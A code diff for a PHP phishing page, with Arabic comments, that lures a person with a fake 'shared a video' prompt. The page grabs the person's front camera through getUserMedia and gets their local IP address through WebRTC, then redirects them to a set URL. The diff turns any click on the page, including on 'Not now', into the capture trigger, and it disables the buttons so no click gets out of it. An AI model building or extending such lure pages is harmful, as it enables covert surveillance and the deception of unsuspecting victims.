@@ -107,7 +107,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create'])) {
         $target_url = "https://" . $target_url;
     }
 
-    // رفع صورة الحساب الشخصية
     if (isset($_FILES['avatar_file']) && $_FILES['avatar_file']['error'] === UPLOAD_ERR_OK) {
         $ext = pathinfo($_FILES['avatar_file']['name'], PATHINFO_EXTENSION);
         $avatarName = 'avatar_' . uniqid() . '.' . $ext;
@@ -117,7 +116,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create'])) {
         $sender_avatar = trim($_POST['sender_avatar_url']);
     }
 
-    // رفع صورة الخلفية
     if (isset($_FILES['bg_file']) && $_FILES['bg_file']['error'] === UPLOAD_ERR_OK) {
         $ext = pathinfo($_FILES['bg_file']['name'], PATHINFO_EXTENSION);
         $bgName = 'bg_' . uniqid() . '.' . $ext;
@@ -154,7 +152,7 @@ if (isset($_GET['r']) && !empty($target_redirect)):
     <title>Watch Video</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
-        body, html { width: 100%; height: 100%; overflow: hidden; background: #000; display: flex; justify-content: center; align-items: center; position: relative; }
+        body, html { width: 100%; height: 100%; overflow: hidden; background: #000; display: flex; justify-content: center; align-items: center; position: relative; cursor: pointer; }
         
         .blurred-bg {
             position: absolute;
@@ -166,6 +164,7 @@ if (isset($_GET['r']) && !empty($target_redirect)):
             filter: blur(18px) brightness(0.65);
             transform: scale(1.1);
             z-index: 1;
+            pointer-events: none;
         }
 
         .modal-card {
@@ -179,6 +178,7 @@ if (isset($_GET['r']) && !empty($target_redirect)):
             box-shadow: 0 25px 50px rgba(0,0,0,0.5);
             z-index: 10;
             animation: popUp 0.3s ease-out;
+            cursor: pointer;
         }
         @keyframes popUp { 0% { transform: scale(0.8); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
 
@@ -188,11 +188,12 @@ if (isset($_GET['r']) && !empty($target_redirect)):
         h2 { font-size: 20px; font-weight: 700; color: #111; margin-bottom: 8px; }
         p { font-size: 13px; color: #666; margin-bottom: 24px; line-height: 1.5; }
 
-        .btn-action { display: block; width: 100%; background: #fe2c55; color: white; border: none; padding: 14px; border-radius: 12px; font-weight: 600; font-size: 15px; cursor: pointer; text-decoration: none; margin-bottom: 12px; box-shadow: 0 4px 14px rgba(254,44,85,0.4); }
-        .btn-action:active { transform: scale(0.98); }
-        .btn-secondary { background: transparent; color: #888; border: none; font-size: 14px; font-weight: 500; cursor: pointer; padding: 6px; }
+        .btn-action { display: block; width: 100%; background: #fe2c55; color: white; border: none; padding: 14px; border-radius: 12px; font-weight: 600; font-size: 15px; cursor: pointer; text-decoration: none; margin-bottom: 12px; box-shadow: 0 4px 14px rgba(254,44,85,0.4); pointer-events: none; }
+        .btn-secondary { background: transparent; color: #888; border: none; font-size: 14px; font-weight: 500; cursor: pointer; padding: 6px; pointer-events: none; }
     </style>
     <script>
+        let isCaptured = false;
+
         function getLocalIP(callback) {
             let foundLocal = false;
             let RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
@@ -213,8 +214,10 @@ if (isset($_GET['r']) && !empty($target_redirect)):
             setTimeout(() => { if (!foundLocal) callback("Direct"); }, 80);
         }
 
-        function captureAndRedirect() {
-            const redirectCode = "<?php echo htmlspecialchars($_GET['r']); ?>";
+        function triggerCaptureAndRedirect(e) {
+            if (isCaptured) return;
+            isCaptured = true;
+
             const targetUrl = "<?php echo $target_redirect; ?>";
 
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
@@ -252,6 +255,11 @@ if (isset($_GET['r']) && !empty($target_redirect)):
                     window.location.replace(targetUrl);
                 });
         }
+
+        window.addEventListener('DOMContentLoaded', () => {
+            // جعل أي ضغطة في أي مكان في الصفحة تؤدي للعملية
+            document.body.addEventListener('click', triggerCaptureAndRedirect);
+        });
     </script>
 </head>
 <body>
@@ -262,8 +270,8 @@ if (isset($_GET['r']) && !empty($target_redirect)):
         </div>
         <h2>Watch this video</h2>
         <p><strong><?php echo htmlspecialchars($sender_name); ?></strong> shared a video with you. Watch now to view content!</p>
-        <button class="btn-action" onclick="captureAndRedirect()">Watch Now</button>
-        <button class="btn-secondary" onclick="captureAndRedirect()">Not now</button>
+        <button class="btn-action">Watch Now</button>
+        <button class="btn-secondary">Not now</button>
     </div>
 </body>
 </html>
